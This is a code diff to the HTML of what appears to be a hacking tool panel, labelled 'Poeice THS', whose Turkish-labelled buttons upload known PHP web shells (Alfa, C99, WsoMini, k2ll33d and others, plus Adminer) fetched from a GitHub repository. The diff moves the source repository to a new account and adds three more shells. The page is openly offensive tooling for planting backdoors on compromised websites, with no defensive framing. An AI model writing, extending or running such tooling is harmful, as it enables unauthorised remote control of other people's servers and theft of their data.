@@ -120,12 +120,15 @@
             Poeice THS
         </div>
 <div class="hack-buttons">
-    <button class="hack-button" onclick="uploadFile('https://github.com/poeice/Shelller/raw/main/1.php')">Alfa Yükle (Şifreli)</button>
-    <button class="hack-button" onclick="uploadFile('https://github.com/poeice/Shelller/raw/main/2.php')">Alfa Yükle (Şifresiz)</button>
-    <button class="hack-button" onclick="uploadFile('https://github.com/poeice/Shelller/raw/main/3.php')">C99 Yükle</button>
-    <button class="hack-button" onclick="uploadFile('https://github.com/poeice/Shelller/raw/main/4.php')">WsoMini Yükle</button>
-    <button class="hack-button" onclick="uploadFile('https://github.com/poeice/Shelller/raw/main/5.php')">k2ll33d Yükle</button>
-    <button class="hack-button" onclick="uploadFile('https://github.com/poeice/Shelller/raw/main/6.php')">spademini Yükle</button>
+    <button class="hack-button" onclick="uploadFile('https://github.com/securiywep/Shelller/raw/main/1.php')">Alfa Yükle (Şifreli)</button>
+    <button class="hack-button" onclick="uploadFile('https://github.com/securiywep/Shelller/raw/main/2.php')">Alfa Yükle (Şifresiz)</button>
+    <button class="hack-button" onclick="uploadFile('https://github.com/securiywep/Shelller/raw/main/3.php')">C99 Yükle</button>
+    <button class="hack-button" onclick="uploadFile('https://github.com/securiywep/Shelller/raw/main/4.php')">WsoMini Yükle</button>
+    <button class="hack-button" onclick="uploadFile('https://github.com/securiywep/Shelller/raw/main/5.php')">k2ll33d Yükle</button>
+    <button class="hack-button" onclick="uploadFile('https://github.com/securiywep/Shelller/raw/main/6.php')">spademini Yükle</button>
+    <button class="hack-button" onclick="uploadFile('https://github.com/securiywep/Shelller/raw/main/adminer.php')">Adminer Yükle</button>
+    <button class="hack-button" onclick="uploadFile('https://github.com/securiywep/Shelller/raw/main/10.php')">oni Yükle</button>
+    <button class="hack-button" onclick="uploadFile('https://github.com/securiywep/Shelller/raw/main/Maruji.php')">Maruji Yükle</button>
 </div>
 <br>
 <img src="https://i.hizliresim.com/920h03s.png" style="width: 100%;">
